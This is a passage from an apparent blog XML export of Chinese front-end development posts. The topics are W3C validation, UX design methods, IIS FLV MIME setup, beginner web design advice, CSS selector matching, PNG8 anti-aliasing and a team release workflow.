    <url>%2F2015%2F07%2F12%2F%E5%A6%82%E4%BD%95%E8%AE%A9%E7%BD%91%E7%AB%99%E9%A1%BA%E5%88%A9%E9%80%9A%E8%BF%87w3c%E9%AA%8C%E8%AF%81%2F</url>
    <content type="text"><![CDATA[1、官方的检查机制有些问题。背景色与字体色相同的情况下会有错误提示。这是不合理的检测报错机制。2、图片的 alt=”” 属性必须每张图片都加上，而且对齐属性用CSS来定义。不加不能通过XHTML 1.0的验证。3、每个文档必须加上DTD声明。html PUBLIC "-//W3C//DTDXHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">```12345678910111213141516去掉后能通过验证，但有警告：No DOCTYPE found! Checking with default XHTML 1.0 Transitional Document Type.4、RSS的XML通过时其中的域名地址必须与检测的地址一致，否则会报错。因为有两个域名在使用，所以代码中曾经用[www.donzhi.com](http://www.donzhi.com/)，实际页面是[www.baidu.com](http://www.baidu.com/)，这样就出错了。5、```&lt;a&gt;```标签的链接属性加上JAVASCRIPT事件时必须为#空链,不能为javascript:;或javascript:void(null);6、在同一个页面当中，同名的ID会产生冲突。所以以ID定义样式的必须改成类引用。如果不用W3C来检测的话，在CSS设计里是允许这样做的。那是程序的角度不能相同，CSS上是可以相同的！之前就是相同的产生问题，后面就改成类引用了！7、不可省略双引号或单引号。这个是指属性，标准是双引号~单引号也能通过验证。8、标签之间不可错位嵌套。```&lt;div class=&quot;CaseDetaListSS&quot;&gt;原文链接：&lt;a href=&apos;/html/cases/cases_61.html&apos;&gt;798艺术区官方网站&lt;/div&gt;&lt;/a&gt;这是不允许的。9、所有的标签都使用小写。123NO，提示错误为：Line 56, Column 16: there is no attribute &quot;class&quot;```&lt;DIV class=&quot;CaseDetaListSS&quot;&gt;原文链接：&lt;a href=&apos;/html/cases/cases_61.html&apos;&gt;798艺术区10、FLASH的标签代码中不能含有123456711、所有的标签中含有的属性必须有值（官方的说法）。这里说的意思是，如果应用到某个属性，这个属性就比如赋予值，比如width=&quot;12&quot;,不能在标签中出现width=&quot;&quot;但是对于```&lt;img src=&quot;/UserFiles/cases/1225087801-jLThs.jpg&quot; width=&quot;193&quot; height=&quot;94&quot; alt=&quot;&quot; width=&quot;&quot;/&gt;```一样能通过W3C的验证来说，又矛盾了。12、标签必须配对完成,单标签必须以/关闭。```&lt;br&gt;no&lt;br /&gt;YES。并且&lt;br/&gt;也能通过，但不规范。养成好的习惯吧，即使开始的时候有点难，还记得我们上小学的时候，都用田字格来写字，规范我们的习惯后，我们就可以离开田字格写出漂亮的文字了。13、JS和CSS外部引入文件必须加上类型定义。&lt;script&gt;CDFooter();&lt;/script&gt; NO&lt;script type=&quot;text/javascript&quot;&gt;CDFooter();&lt;/script&gt; YES我在做程序员的时候经常性的为了省事，写成：&lt;script&gt;CDFooter();&lt;/script&gt; ，程序都没有任何问题，现在要我写规范，真不习惯。14、所有的样式全部写在外部文件。用类名定义。在使用的地方引用。看了这么多，你是否有写过不符合W3C标准的呢？但是，我不明白其中一点：”FLASH的标签代码中不能含有&lt;embed&gt;,必须采用其它的方法实现。“我一般都用这个标签来出入flash的，没出现什么异常呀！是不是考虑到兼容性的问题呢？还是……大家发表下意见吧！]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>w3c验证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[产品用户体验设计]]></title>
    <url>%2F2015%2F07%2F12%2F%E4%BA%A7%E5%93%81%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C%E8%AE%BE%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[1、用户体验设计的定义&emsp;&emsp;用户体验（User Experience，UE／UX）是指用户在使用一个产品（服务）的过程中建立起来的心理感受，这是一种纯主观的个人感受。&emsp;&emsp; 用户体验设计（UED） 顾名思义，即是对用户使用产品的体验的设计。它是随着设计的发展而成长起来的一个新兴学科。由于用户的体验是用户使用产品的所有心理 感受，感受是复杂交叉的，所以用户体验设计注定就是门交叉学科。它必然涉及到用户使用产品过程中的方方面面。社会学、设计学、心理学、工程技术等领域的知 识都被应用来支撑“用户体验设计”这一新兴的交叉学科。与用户体验的相关学科知识图谱-如图1所示。图1用户体验设计相关学科图谱&emsp;&emsp; 用户体验（User Experience，UE／UX ），是指用户在使用一个产品（服务）的过程中建立起来的心理感受，这是一种纯主观的个人感受。因为这只是用户主观的感 受，所以必然有一定的不确定因素。用户个人的差异同时决定了个体的真实体验是无法通过其他途径来完全模拟或再现。但是当用户被按照某些标准明确界定为不同 的群体的时候，我们就能够通过用户研究和市场调查等实验方法来获取不同用户群体的共性。&emsp;&emsp; 用户体验设计（User Experience Design， UED） 则是对用户使用产品的工程中于产品交互的整个过程的设计。在早期的互联网产品设计过程中用户界面仅仅被当作是功能核心之外的一层“外衣”，就像现 实世界中的产品的包装，往往被开发团队所忽视，只有到开发过程的尾声才开始产品的界面设计。这种开发过程极大的限制了人机交互的设计。由于在最后阶段对产 品的功能核心进行修改的代价巨大，当界面设计的需求与功能核心有冲突的时候，其结果就是牺牲界面设计。在这种开发模式下设计出来的产品往往只能被专业的技 术人员所理解，难以被广大的普通用户群所接受，从而大大降低了用户体验的质量。2、用户体验设计的方法&emsp;&emsp;虽然用户体验设计涉及的范围很广，但是通过对现阶段各种方法的总结大致可以分为：用户体验需求的挖掘、用户体验过程的设计、用户体验设计的结果评估这三个阶段。以上三个阶段可根据具体开发项目的不同选择不同的方法。如图2所示就是用户体验设计各个阶段的方法图谱。图2用户体验设计的方法2·1用户体验设计调查（1）实境调查&emsp;&emsp;实境调查可以获得用户所处的环境信息以及用户在这些环境中如何进行工作等方面的信息；包括对用户的访谈及观察他们的行为；同时，实境调查要在用户的工作场所进行，如此获得的数据可以用于形成用户特征、任务分析、场景和可用性测试脚本；这种技术适合在产品开发的早期阶段。（2）访谈和焦点小组&emsp;&emsp;访谈和焦点小组就是让设计者询问用户对于产品的体验情况，是经过策划的调查活动，通过访谈人员与用户的直接互动，让用户对产品发表意见和建议。（3）互动访谈式调查&emsp;&emsp;调查采访用户，根据列好的问题清单询问用户，并且记录下用户各方面的反应。这种调查与文件调查不同，因为它是互动的，但是又没有焦点小组访谈那么正式。（4）调查问卷（Questionnaire）&emsp;&emsp;先根据调查的目标列出相关的问题清单，然后制作成纸质的或者电子的问卷，让用户在使用前或者使用后根据自身的感受来完成问卷。（5）日志会话&emsp;&emsp;日志会话经常被用来作为远程的调查软件用户界面的方法；用户执行一些任务的原型，就像在正式的进行可用性测试，在完成一系列的任务的同时，客观上也给出了用户对于产品体验的结果；日志部分的评价基本上是自动的。（6）任务分析&emsp;&emsp;用户浏览网站都有一定的目标，然而要达到指定的目标就要经过一系列的任务。任务分析就是把用户的目标分成若干任务，通过分析这些任务来了解用户的操作方式和习惯。（7）用例（User Cases）&emsp;&emsp;描述某个用户使用网站时的情况，包括目标和行动，来分析操作使用过程中可能存在的体验行为。2·2用户体验设计方法（1）脑力风暴（Brain Storming）&emsp;&emsp;脑力风暴是一种产生大量创意的技法，设计小组投入到设计调查所取得的所有数据中，在用户需求的信息指导下，毫无顾忌的产生创意。要点是不能否定别人的创意， 鼓励奇思妙想。脑力风暴的主旨是创造一种氛围，让设计小组的成员感到无拘无束，这样小组成员可能提出在平时认为不太可能提出的解决方案。（2）用户角色模型（Persona）&emsp;&emsp;也可以称为用户概貌（User Profiles），可以说明用户的不同分类及其特征，帮助发团队更好地理解哪些人会以什么方式来使用系统；用户概貌包括的信息有：人口统计数据（年龄、 性别等），教育背景，技术经验，业务技能，态度和动机、使用频率等，为了理解还可以给不同的用户概貌创造一些张贴画，给设计团队制造一些用户，这些用户虽 然是虚拟的，但是从真实的用户数据模拟而来，接近真实，设计团队围绕这个虚拟人物设计开发产品；从之前采访的所有用户综合提炼出一个角色模型。这样可以得 到一个鲜活的用户形象并把所有相关需求和他联系起来，帮助设计师将“目标–用户–任务”联系起来。（3）情景建立（Visioning）&emsp;&emsp;设计师希望设计创造什么样的使用方式，在头脑风暴的时候，为设计构建一个合理的情境，然后把产生的点子落实下来。为方便与其他部门交流，最好画出草图；在一 些矛盾的点子之间有所取舍适合，把把好的点子集中起来，总结出一个最终的解决方案。情境就是创造了一个角色模型使用产品时的故事。（4）故事板（Story board）&emsp;&emsp;描述任务操作的细节，画出交互和操作的步骤，故事板是情景中的细节刻画。（5）设计概念的纸上原型（Design Concept）&emsp;&emsp;设计师简单画出用户使用产品时的交互和操作步骤的线框图，要考虑到可能出现的所有问题和各种使用情况。（6）原型设计（Prototype Design）&emsp;&emsp;低保真度原型和高保真原型可以用于测试中，这在实践开发过程中可以节省时间和资金成本。（7）平行设计&emsp;&emsp;在设计同一个网站的时候，同时设计多个方案，从中选取最佳方案]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>用户体验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[服务器不支持FLV的解决办法]]></title>
    <url>%2F2015%2F07%2F12%2F%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8D%E6%94%AF%E6%8C%81flv%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;随着各大视频提供商对视频网站的投入，FLV文件开始越来越多的出现在我们的身边，闲暇之余，自己也想在服务器上提供一些简单的FLV视频文件，结果发现无法播放。打开IIS，然后在mypc(本地计算机)上面点击右键属性（很多帮助文件都没有说这一点，很多人以为是在站点上面点击右键，却发现找不到MIME类型，其中mypc是你的计算机名）如图所示：然后点击“MIME类型”，接着点击新建加入关联扩展名：.flv，内容类型：flv-application/octet-stream 如图所示：&emsp;&emsp;确定以后，服务器就可以支持FLV视频播放了，如果依然不可以的话，可以尝试重新启动IIS！FLV文件介绍FLV视频文件其实是Flash视频，也就是 Flash Video我们都知道一般的视频文件，如asf、wmv格式使用mediaplayer进行播放，再如rm格式需要使用RealPlayer播放。&emsp;&emsp;这样的问题是格式的不同就需要选择不同的播放器，这对于本地计算机没有安装相应播放器的用户来说，这些视频根本无法收看，并且由于这些文件的容量过大，下载慢，观看也很不流畅。&emsp;&emsp;所以，解决播放器和容量的问题：将各类视频文件转换成Flash视频文件。&emsp;&emsp;播放器有嵌入在浏览器中的Flash播放器，解决了其它一般视频文件需要挑选播放器的问题，当然这也就是Flash的优势。容量方面，从 FlashMX2004起就支持了转换为Flash视频的功能，经过相关设置后，可缩小原有视频的容量，最终转换的文件扩展名是 FLV。&emsp;&emsp;另外提供一个小技巧：如果不能在计算机中添加“MIME类型”，可以吧FLV的后缀名改为SWF，这样也可以！附：服务器不支持FLV的解决办法&emsp;&emsp;在处理FLV文件时，您可能需要配置服务器以便于处理FLV文件格式。多用途Internet邮件扩展(MIME)是标准的数据规范，允许您通过Internet 连接发送非 ASCII文件。&emsp;&emsp;Web浏览器和电子邮件客户端经过配置，可以解释多种MIME类型，因此它们可以发送和接收视频、音频、图形和格式化文本。若要从Web 服务器加载FLV文件，则可能需要向您的Web服务器注册文件扩展名和MIME类型，因此应当检查您的Web服务器文档。FLV文件的MIME类型是video/x-flv。下面列出FLV文件类型的完整信息：Mime 类型：video/x-flv文件扩展名：.flv必需的参数：无可选的参数：无编码注意事项：FLV文件是二进制文件；有些应用程序可能需要设置应用程序八位字节流子类型。安全问题：无&emsp;&emsp;已发布的规范：www.macromedia.com/go/flashfileformat。 Microsoft更改了在 Microsoft Internet 信息服务(IIS) 6.0 Web服务器中处理流媒体的方式，不再采用早期版本中的处理方式。早期版本的IIS不需要对 Flash 视频流做任何修改。在 Windows 2003附带的默认Web服务器、 IIS 6.0中，服务器需要借助MIME 类型来确认 FLV 文件为流媒体。&emsp;&emsp;当采用流式媒体的方式加载外部 FLV 文件的 SWF文件被置于 Microsoft Windows 2003服务器上，并在浏览器中查看时，可以正确播放 SWF文件，但FLV视频却不能采用流式媒体的方式加载。这个问题会影响到放置在 Windows 2003服务器上的所有 FLV文件，包括用早期版本的Flash创作工具 (Macromedia Flash Video Kit for Dreamweaver MX 2004)制作的那些文件。如果在其它操作系统上对这些文件进行测试，则这些文件可以正常工作。&emsp;&emsp;有关配置 Microsoft Windows 2003 和 Microsoft IISServer 6.0 以采用流式媒体的方式加载 FLV 视频的信息，请访问www.macromedia.com/go/tn_19439。 今天遇到一个难题，用FLASH8制作的FLV格式文件上传服务器后不能播放，原以为是路径错了，或者太大，检查过后不是，因为国内大多都是Win2003的主机.默认是没有指定输出FLV这种格式的虽然FTP里面可以看见,但无法通过http访问,也就无法播放了.&emsp;&emsp;[原因：WIN2003加强了IIS6的MIME验证，一切未注册扩展文件格式统统显示404错误。手动在IIS中HTTP头-&gt;MIME添加MIME影射关系，MIME类型: video/x-flv 扩展名:.flv，即可通过Flash7+客户端Load进来播放]&emsp;&emsp;[办法解决“虚拟主机都不支持Flv格式文件”的问题：比如你的Flv文件名称是a.flv,在虚拟主机上建一个名为“a.flv”的目录，在此目录下放你的Flv格式文件，将其改名为：index.htm ,这样就行了，播放器中的文件名保持原样不动]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>服务器flv</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网页设计初学者应该把握几个大局]]></title>
    <url>%2F2015%2F07%2F12%2F%E7%BD%91%E9%A1%B5%E8%AE%BE%E8%AE%A1%E5%88%9D%E5%AD%A6%E8%80%85%E5%BA%94%E8%AF%A5%E6%8A%8A%E6%8F%A1%E5%87%A0%E4%B8%AA%E5%A4%A7%E5%B1%80%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;网页设计的综合性极强，如果你没有5年以上的设计经验，可以尽量放低调一点，哪怕你是某知名设计艺术学校毕业的，也一样。它跟平面设计差别很大，平面设计更追求单一化、精细化，而网页设计不仅要做到精细，更考验设计师的综合能力。&emsp;&emsp;对于网页设计初学者而言，一定要把握以下几个大局，你的方向才不会偏离，少走很多弯路。一、网页设计软件的熟练掌握&emsp;&emsp;我在网上看过很多文章基本雷同，观点：网页设计不是只掌握了几个软件就能搞好网页设计的。那么今天我就要更正一下这个说法，它只把话说到一半，另一半它叫想从事网页设计的人自己去想。首先你是需要熟练掌握以下几个软件PhotoshopDreamweaverlash其中Photoshop和Dreamweaver需要深入一些，而对于Flash，只要掌握简单的动画能即可。&emsp;&emsp;对于做网页设计，你首先要掌握的便是软件熟练操作使用，特别是快捷键。熟练地掌握了软件，网页制作可以说你已经掌握了20%。这也是网页设计里的大局之一。二、博览优秀网页设计，思考、学习，并不断练习&emsp;&emsp;有了前面的基础，你便需要多看优秀的网页设计。很多做设计的人认为国外的网站好，简洁实用。其实在我们国内也有很多优秀的网页设计，比如网页设计师联盟，站酷，设计路上等等一些现成的优秀设计作品库，里面有很多网页设计精粹，初学网页设计者很有必要去大量浏览，并做好笔记。&emsp;&emsp;我有个习惯，每天都会花1个小时去浏览优秀的网页设计，看看别人的网站里有什么新意，他们为什么要这么做，当然也会发现一些问题，并给他留言。有用的素材也会自觉地保存起来，以备用，这应该叫“拿来主义”。&emsp;&emsp;网页设计初学者还需要勤加练习，如果你身边有一位资历较高的前辈，我想你的设计水平会在较短的时间内得到较大的提高。这是实话。三、网页设计色彩的理解与把握&emsp;&emsp;网页设计的色彩虽然比较理论化，网上也有陈述太多这样的色彩理论知识，我自己看了很多基本也是雷同的。这里我要说的是针对具体公司网站的设计，你需要注意以下方面：&emsp;&emsp;企业客户所处行业，产品以及跟产品有关联性的事、物。每个行业都有自己的特色，特别是标志性的色调，行业的标志色可以在整个行业上通用，只是在某些特殊情况可能有一些小小的变更。&emsp;&emsp;客户公司的企业文化。这点到于有一定发展或者发展时间较长的企业来说是相当重要的，企业文化一旦形成，将给公司酝酿并形成一个独一无二的品牌。&emsp;&emsp;企业发展的方向与愿望。这个看上去比较虚，因为它是摸不着，也看不见的抽象事物，它只是给人一种感觉，感觉未来是这样的。所以这种色调它是抽象化的。四、网页设计要与客户沟通&emsp;&emsp;做任何设计，没有与客户良好的沟通，自己认为多么牛B的设计都是扯蛋。有句话叫“顾客就是上帝”，客户出钱，设计师出力为顾客提供有效服务。如果你是一名网页设计师，你会如何与客户沟通网站的相关事项呢？作为网页设计初学的你，对这点肯定比较迷惑。以下是初学者需要熟悉的：&emsp;&emsp;先了解客户企业的基本情况，如从事的行业，所做的网站是否是与此相关整理客户公司网站的初步构想，并列出表格与客户电话沟通网站的基本事项， 了解需求，完善上一步网站的构想，并将客户对网站的需求结合，作进一步的分析将你对客户网站的初步想法与客户说明，并让客户也参与讨论开始网页设计，出网站风格效果&emsp;&emsp;上面是一个网页设计初学者需要了解与客户沟通的基本流程，并通过这些注意事项，将客户服务好，这是做网页设计的最终目的。五、网页设计需要做细节&emsp;&emsp;这是很多初学网页设计人员经常会犯的共同毛病。网页设计细节处理应该从以下几方面进行：&emsp;&emsp;CSS样式要简洁，一律使用外部调用图片在保证清晰的前提下实现最小化，并固定宽、高，同时为图片加上说明内容，符合搜索引擎的友好度网页布局统一使用Xhtml布局，是数据统计，则统一用Table表格罗列网页设计需要符合标准尺寸。根据目前主流电脑显示屏大小来看，1024×768这个尺寸无论从视觉还是从感觉上看，都已经将更小尺寸的挤出市场，所以建议用1024×768的标准尺寸。&emsp;&emsp;针对网页设计初学者的总结语：遇到问题可以请教你身边的同事或朋友，毕竟网页设计是一件很综合的学科，如果你想从事网页设计这一行业，一定要坚持，无论你有没有基础，无论你有没有学过什么美术，只要你真的热衷于这一行业，就认真地去做，把自己的人生之路走好。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[从事前端开发必须要了解的CSS原理]]></title>
    <url>%2F2015%2F07%2F12%2F%E4%BB%8E%E4%BA%8B%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%BF%85%E9%A1%BB%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84css%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;从事Web前端开发的人都与CSS打交道很多，有的人也许不知道CSS是怎么去工作的，写出来的CSS浏览器是怎么样去解析的呢？当这个成为我们提高CSS水平的一个瓶颈时，是否应该多了解一下呢？一、浏览器的发展与CSS&emsp;&emsp;网页浏览器主要通过 HTTP 协议连接网页服务器而取得网页， HTTP 容许网页浏览器送交资料到网页服务器并且获取网页。目前最常用的 HTTP 是 HTTP/1.1，这个协议在 RFC2616 中被完整定义。HTTP/1.1 有其一套 Internet Explorer 并不完全支援的标准，然而许多其他当代的网页浏览器则完全支援这些标准。网页的位置以 URL（统一资源定位符）指示，此乃网页的地址；以 http: 开首的便是通过 HTTP协议登陆。很多浏览器同时支援其他类型的 URL 及协议，例如 ftp: 是 FTP（档案传送协议）、gopher: 是 Gopher 及 https: 是 HTTPS（以SSL加密的HTTP）。&emsp;&emsp;早期的网页浏览器只支援简易版本的HTML。专属软件的浏览器的迅速发展导致非标准的 HTML 代码的产生。但随着 HTML 的成长，为了满足设计师的要求，HTML 获得了很多显示功能。随着这些功能的增加外来定义样式的语言越来越没有意义了。&emsp;&emsp;1994年哈坤·利提出了 CSS 的最初建议。伯特·波斯（BertBos）当时正在设计一个叫做 Argo 的浏览器，他们决定一起合作设计CSS。&emsp;&emsp;当时已经有过一些样式表语言的建议了，但 CSS 是第一个含有“层叠”的主意的。在 CSS 中，一个文件的样式可以从其他的样式表中继承下来。读者在有些地方可以使用他自己更喜欢的样式，在其他地方则继承，或“层叠”作者的样式,这种层叠的方式使作者和读者都可以灵活地加入自己的设计，混合各人的爱好。&emsp;&emsp;1997年初，W3C 内组织了专门管 CSS 的工作组，其负责人是克里斯·里雷。这个工作组开始讨论第一版中没有涉及到的问题，其结果是1998年5月出版的第二版要求。到2007年为止，第三版还未完备。二、浏览器是如何渲染页面和加载页面&emsp;&emsp;为什么有些网站打开的时候会加载会很慢，而且是整个页面同时显示的，而有些网站是从顶到下逐步显示出来的？要搞懂这个可以先从下面这个常规流程开始：1. 浏览器下载的顺序是从上到下，渲染的顺序也是从上到下，下载和渲染是同时进行的。2. 在渲染到页面的某一部分时，其上面的所有部分都已经下载完成（并不是说所有相关联的元素都已经下载完）。3. 如果遇到语义解释性的标签嵌入文件（JS脚本，CSS样式），那么此时IE的下载过程会启用单独连接进行下载。4. 并且在下载后进行解析，解析过程中，停止页面所有往下元素的下载。5. 样式表在下载完成后，将和以前下载的所有样式表一起进行解析，解析完成后，将对此前所有元素（含以前已经渲染的）重新进行渲染。6. JS、CSS中如有重定义，后定义函数将覆盖前定义函数。这里关键的是第2-5这三点。渲染效率与下面三点有关：1. CSS 选择器的查询定位效率2. 浏览器的渲染模式和算法3. 要进行渲染内容的大小三、什么是 CSS 以及 CSS 的优点什么是 CSS？•CSS 是 Cascading Style Sheets(层叠样式表)的简称。•CSS 语言是一种标记语言，它不需要编译，可以直接由浏览器解释执行(属于浏览器解释型语言)。•在标准网页设计中 CSS 负责网页内容 (XHTML)的表现。•CSS 文件也可以说是一个文本文件，它包含了一些 CSS 标记，CSS 文件必须使用 css 为文件名后缀。•可以通过简单的更改 CSS 文件，改变网页的整体表现形式，可以减少我们的工作量，所以它是每一个网页设计人员的必修课。•CSS是由W3C的CSS工作组产生和维护的。采用 CSS+DIV 进行网页重构，相对与传统的 TABLE 网页布局而具有以下3个显著优势：1. 表现和内容相分离。将设计部分剥离出来放在一个独立样式文件中，HTML文件中只存放文本信息。这样的页面对搜索引擎更加友好。2. 提高页面浏览速度。对于同一个页面视觉效果，采用 CSS+DIV 重构的页面容量要比 TABLE 编码的页面文件容量小得多，前者一般只有后者的1/2大小。浏览器就不用去编译大量冗长的标签。3. 易于维护和改版。你只要简单的修改几个 CSS 文件就可以重新设计整个网站的页面。四、浏览器对 CSS 的匹配原理&emsp;&emsp;浏览器CSS匹配不是从左到右进行查找，而是从右到左进行查找。比如之前说的 DIV#divBox p span.red{color:red;}，浏览器的查找顺序如下：先查找 html 中所有 class=’red’ 的 span 元素，找到后，再查找其父辈元素中是否有p元素，再判断p的父元素中是否有 id 为 divBox 的 div 元素，如果都存在，则 CSS 匹配上。&emsp;&emsp;浏览器从右到左进行查找的好处是为了尽早过滤掉一些无关的样式规则和元素。Firefox 称这种查找方式为 keyselector(关键字查询)，所谓的关键字就是样式规则中最后(最右边)的规则，上面的 key 就是 span.red。五、优化你的 CSS&emsp;&emsp;所谓高效的 CSS 就是让浏览器在查找 style 匹配的元素的时候尽量进行少的查找，下面列出一些我们常见的写 CSS 犯一些低效错误：1、不要在ID选择器前使用标签名一般写法：DIV#divBox更好写法：#divBox解释：因为ID选择器是唯一的，加上div反而增加不必要的 CSS 匹配。2、不要在 class 选择器前使用标签名一般写法：span.red更好写法：.red解释：同第一条，但如果你定义了多个.red，而且在不同的元素下是样式不一样，则不能去掉，比如你css文件中定义如下：p.red{color:red;} span.red{color:#ff00ff}如果是这样定义的就不要去掉，去掉后就会混淆，不过建议最好不要这样写3、尽量少使用层级关系一般写法：#divBoxp.red{color:red;}更好写法：.red{..}4、使用 class 代替层级关系一般写法:#divBox ul li a{display:block;}更好写法：.block{display:block;}5、在 CSS 渲染效率中 id 和 class 的效率是基本相当的&emsp;&emsp;class 会在第一次载入中被缓存，在层叠中会有更加好的效果，在根部元素采用id会具有更加好（id有微妙的速度优势）。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>css原理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ps保存png8消除锯齿的方法]]></title>
    <url>%2F2015%2F07%2F12%2Fps%E4%BF%9D%E5%AD%98png8%E6%B6%88%E9%99%A4%E9%94%AF%E9%BD%BF%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[发现制作完成的ＰＮＧ图片上传网站后，出现许多锯齿。蓝色理想里的人们认为模糊图片边缘，用绘制工具对锯齿进行涂抹可以解决锯齿问题。但我认为这种方法比较繁琐，而且处理小图片的过程中很容易损害图片的像素，造成精度降低。经反复测试，正确的方法应该为：将制作好的ＰＮＧ图片保存为“ＷＥＢ”和设备所用的格式——ＡＬＴ＋ＳＨＩＦＴ＋ＣＴＲＬ＋Ｓ，打开参数控制面板。在预设中选ＰＮＧ８、可选择、扩散、勾选“可选择”复选框，再选“无透明度仿色”。然后选颜色２５６，仿色８７％（视现实情况自定），杂边选与背景相似的颜色，亦可自定，能无痕地填补锯齿为佳。ＷＥＢ靠色自选，上面的ＰＮＧ选“０”。]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>png8锯齿</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关注前端开发流程]]></title>
    <url>%2F2015%2F07%2F12%2F%E5%85%B3%E6%B3%A8%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;流程，通俗来讲，就是许多人，在做一系列的事情时，怎样相互协调，安排好这一系列事情的先后顺序，有什么事先的约定，需要达到怎样的预期目标。&emsp;&emsp;在UED里，前端同学需要处理的需求比较多，早些时候，前端这里的开发流程还是比较模糊的，UED以外的同学也不清楚这边的工作具体是怎样进行的，所以难免会有需求插队的情况发生，打乱了大家的计划，因此今年Q3的时候，在与SCM团队同学的共同努力下，形成了一个前端的ASSETS发布流程。&emsp;&emsp;这个流程主要针对ASSETS发布的需求做了一些约定，制定了相关的几个时间点，包括审核需求、提交代码、daily测试、预发测试、正式发布到线上确认的时间ASSETS流程简述需求审核&emsp;&emsp;在提需求之前，需求方一般都会先找PM或者相应产品线的前端咨询一下，如果可行的话就会在周四之前将需求提到平台上，到了周四的时候，前端会结合自身的工作情况，将平台上的需求接收并纳入自己的日程中，预估完成时间、发布时间以及相关的发布简述。编码开发&emsp;&emsp;周四需求评估完以后，就会按计划开始处理需求，将涉及ASSETS发布的需求优先处理，不涉及ASSETS的放在靠后的时间处理，一般这段时间是从周四到下一周的周二。SCM会在每周四开一个新的ASSETS分枝供前端在下一周开发使用。提交代码，合并到daily测试以及预发测试&emsp;&emsp;如果有涉及到与后台开发相关的需求，前端的同学会在周一就把代码提交，这一天会有一次合并代码，方便后台开发来测试。其他的同学一般最晚会在周二下班之前把代码提交，在周二，会有多次合并代码到daily的操作，每次操作完后，SCM的同学会在前端的群里通知到大家，方便大家测试。&emsp;&emsp;周三早上，SCM的同学会将代码发布到预发环境，此时就可以在HOST中绑定IP，换用线上的地址来测试。正式发布周四上午，SCM的同学确认后，将没有问题的代码发布上线。流程的作用&emsp;&emsp;在团队不断成长的过程中，处理的需求数量也在增长，需要考虑到开发的效率、产品的质量以及团队协作间的配合等因素，这个流程能为我们解决很多相关的问题：督促需求方做好相关的规划&emsp;&emsp;有些时候，一些需求的细节还没完全确定，但需求方总希望能将他想到的各种细节都实现出来，然后再挑选其中一种做为他的方案，所以需求的变更会有些频繁，然而这样的成本有些高，一切应该在计划后再去实现，而非反其道而行。现在需求方会在提需求之前，会花时间地去考虑他们的需求，将尽可能多的情况都想清楚，做好必要的沟通工作，权衡各种利弊之后，再给出一个比较成形的方案。保证需求安排的有序性&emsp;&emsp;在一个大的团队中，不同部门的同学在一起合作，因为沟通及一些特殊情况，效率或多或少会受到一些影响，良好的规划能有助于提高开发的效率。&emsp;&emsp;通过每周的需求审核，安排好下一周的日程，由于需求的优先级和先后顺序都已排定，工作的条理性会更加清晰，需求插队的现象也有明显减少。当然我们也有紧急流程，但是它仅限于处理线上bug以及一些经过多方确认的紧急需求，有其自己的适用范围。统一测试，归避风险&emsp;&emsp;之前的日常处理中，可能会遇到这样的情况：甲、乙两个同学分别需要处理两个日常需求，他们的需要改动到的代码会有重合的部分，如果他们并不知道这个情况，那么在他们本地的单独测试中，一切都是OK的，然而当发布到线上去时，发现出了bug或者一方的改动没有同步到线上，查原因后发现是提交的代码相互覆盖了。&emsp;&emsp;现在要处理的需求数量越来越多，为了避免上述情况，新流程实行以后，大家会统一来做多次测试，这样就更容易发现bug，可以大大降低协作开发而产生的风险。&emsp;&emsp;流程本身就是一把双刃剑，有利有弊。一方面，它使我们的需求变得有序，使前端能够在处理一个需求时，不会频繁被其他插队的需求打断。并且因为发布有时间点的设定，所以测试工作会更加严谨，这有助于提升代码的质量。因此对于我们来讲，流程带来的好处是显而易见的；但另一方面，它额外地增加了做事的成本，涉及ASSETS发布的需求，就像赶某班火车一样，错过了就只能等下一班，所以也给需求方带来了许多不便，有待改进，不过这可以通过长期的合作而慢慢被弱化，双方达成了一种默契以后，情况会好很多，现在这样的情况已经比较少了。&emsp;&emsp;尽管在流程使用之初，会带来诸多不便，但是从长远来看，流程有助于使一个团队形成统一的工作方式和态度，将繁杂的事情化整为零，有条理地去处理它们。因为流程，每一个人的责任感都会增强，对风险考虑得会更多一些，这一切都会使产品有质的提升。而我们所有与这个流程有关的人，都会不断地去推动流程改进的工作，这其中还有很多需要思考的：如何将我们的流程推广到整个公司，让大家都能了解我们的流程，这样在未来需要合作时，需求方需要注意些什么，相关的时间点以及开周时间的预估等，他们就会心中有数。ASSETS的发布还不够灵活，如果把和应用相关的ASSETS独立划分出去与应用一起发布，这样剩下的需要发布的东西就会少很多。或者是按产品线来设计发布流程，根据实际情况来发布。如何来简化流程上的一些细节，在保持效率的同时，降低实际操作中的成本。每周二是一个特别的时间点，为了赶在这最后时间提交代码，之前的开发会有些紧张，这种情况也有待改善，比如未来可以一周有两次发布。流程不是生来就完美，但从现在它带给我们的好处来看，遵循并使用它，对我们的开发会起到很大的帮助作用。我们对待它的态度，决定了它对我们会有怎样的反馈，如果觉得它不合适了，就发出自己的声音，想办法去改进它，不要只是被动地等待。部分名词解释：daily环境：UED的一个日常测试环境预发环境：外网IP，需绑定访问，供内部使用测试AS